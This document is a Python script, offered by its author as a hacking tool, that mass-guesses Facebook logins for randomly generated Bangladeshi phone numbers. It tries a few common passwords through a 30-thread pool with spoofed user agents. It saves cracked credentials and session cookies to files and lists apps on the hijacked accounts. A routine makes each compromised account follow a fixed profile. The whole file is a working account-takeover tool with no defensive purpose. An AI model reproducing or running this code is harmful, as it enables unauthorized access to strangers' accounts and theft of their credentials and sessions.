import os
print("\033[1;92m [•] SHOAIB AHAMED  (ROBOT) SYSTEM INSTALL. . . . \033[1;30m")
os.system("pkg install espeak")
print("\033[1;92m   [•] ROBOT INSTALL COMPLETE \033[1;30m")
os.system('espeak -a 300 "Robot install complete"')
print("\033[1;92m   [•] UPDATE CHECKING \033[1;30m")
os.system('espeak -a 300 "WAITING FOR UPDATE"')
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
os.system('espeak -a 300 "Walcome To SHOAIB AHAMEDD CYBER  WOULD"')
os.system('speak -a 400 "Hacking   Tools"')
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
          
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.002)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo = ("""\033[1;32;1m 
███████╗██╗  ██╗ ██████╗  █████╗ ██╗██████╗ 
██╔════╝██║  ██║██╔═══██╗██╔══██╗██║██╔══██╗
███████╗███████║██║   ██║███████║██║██████╔╝
╚════██║██╔══██║██║   ██║██╔══██║██║██╔══██╗
███████║██║  ██║╚██████╔╝██║  ██║██║██████╔╝
╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝╚═════╝ 
\033[1;34;1m=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-×SH
\033[1;33;1m  Github   : Bdshoaiballsadi
\033[1;33;1m  Author   : SHOAIB AHAMED
\033[1;33;1m  Facebook : https://facebook.com/shoaibahamed421
\033[1;33;1m  Virson   : 0.1_FREE
\033[1;34;1m=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-×SH

\033[1;37;1m░░░░░░░\033[1;37m╬ \033[1;37m\033[1;41m𝕀𝔽 𝕐𝕆𝕌 𝔻ℝ𝔼𝔸𝕄 𝕀𝕋 𝕐𝕆𝕌 ℂ𝔸ℕ 𝔻𝕆 𝕀𝕋\033[0m\033[1;37m ╬░░░░░░░
\033[1;37;1m-----------------------------------------------""")
loop = 0
oks = []
cps = []
def clear():
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/shoaibahamed421')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['itel vesion 3 plus','Infinix X672','Infinix X6815B','Infinix X6815B','Infinix X6515','Infinix X6516','Infinix X6825','Infinix X5516B','Infinix X669C','Infinix X669D','Infinix X6815C','Infinix X670','Infinix X5516C','Infinix X6826B','Infinix X5516C','Infinix X676C','Infinix X697','Infinix X5516B','Infinix X6515','Infinix X6811'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    

def samiya(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :riddu = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :riddu = '√ 2009'
        elif uid[:8] in ['10000000']        :riddu = '√ 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:riddu = '√ 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:riddu = ' 2010'
        elif uid[:6] in ['100001']          :riddu = '√ 2010/2011'
        elif uid[:6] in ['100002','100003'] :riddu = '√ 2011/2012'
        elif uid[:6] in ['100004']          :riddu = '√ 2012/2013'
        elif uid[:6] in ['100005','100006'] :riddu = '√ 2013/2014'
        elif uid[:6] in ['100007','100008'] :riddu = '√ 2014/2015'
        elif uid[:6] in ['100009']          :riddu = '√ 2015'
        elif uid[:5] in ['10001']           :riddu = '√ 2015/2016'
        elif uid[:5] in ['10002']           :riddu = '√ 2016/2017'
        elif uid[:5] in ['10003']           :riddu = '√ 2018/2019'
        elif uid[:5] in ['10004']           :riddu = '√ 2019/2020'
        elif uid[:5] in ['10005']           :riddu = '√ 2020'
        elif uid[:5] in ['10006','10007','']:riddu = '√ 2021'
        elif uid[:5] in ['10008']           :riddu = '√ 2022'
        elif uid[:5] in ['10009']           :riddu = '√ 2023'
        else:riddu=''
    elif len(uid) in [9,10]:
        riddu = ' √ 2008/2009'
    elif len(uid)==8:
        riddu = '√ 2007/2008'
    elif len(uid)==7:
        riddu = '√ 2006/2007'
    else:riddu=''
    return riddu
    
    
    
def riddu():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print('\033[1;30m BANGLADESH_CODE - \033[1;32m016 \033[1;32m017 \033[1;32m013 \033[1;32m018 \033[1;32m019 \033[1;32m014 \033[1;32m015')
    os.system('espeak -a 300 "choice bangladesh code"')
    print('')
    code = input('\033[1;92m   CHOOSE YOUR COUNTRY CODE : ')
    print("")
    os.system('clear')
    print("")
    os.system('clear')
    print(logo)
    limit = int(input('\033[1;93m   EXAMPLE : \033[1;92m2000, 5000, 10000, 50000\n\n\033[1;92m   CHOOSE CLONING LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:
        os.system("clear")
        print(logo)
        tl = str(len(user))
        print('\033[1;92m   CHOOSE YOUR CODE : \033[1;92m' +code)
        os.system('espeak -a 300 "Your choice code"' +code)
        print('\033[1;92m   TOTAL IDS : \033[1;92m'+tl)
        os.system('espeak -a 300 "total  id limit"'+tl)
        print('\033[1;92m   TO STOP PROCESS Ctrl + Z')
        os.system('espeak -a 300 "clone stop to press cntrol z"')
        print('\033[1;92m   WILL RUN ON ANY NETWORK')
        jalan('   💥💥 WAIT A 5 MINUTES 💥💥')
        os.system('espeak -a 300 "Wait for 5 minutes"')
        print('')
        for love in user:
            pwx = [love, 'bangladesh', 'i love you']
            uid = code+love
            manshera.submit(rcrack,uid,pwx,tl)
    print('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;90mCRACK PROCESS HAS BEEN COMPLETED ')
    os.system('espeak -a 300 "PROCESS HAS BEEN COMPLETED"')
    print('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;92mIDS SAVED IN SHOAIB.txt')
print(f"\n{x} \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××")
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            
            header_freefb = {
                    'authority': 'm.facebook.com',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'en-US,en;q=0.9',
                    'cache-control': 'max-age=0',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-model': '"i60"',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-ch-ua-platform-version': '"7.0.0"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': pro}
            lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[SHOAIB-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/SHOAIB-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;33m [SHOAIB-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;95m')
                open('/sdcard/SHOAIB-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}SHOAIB{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass



riddu()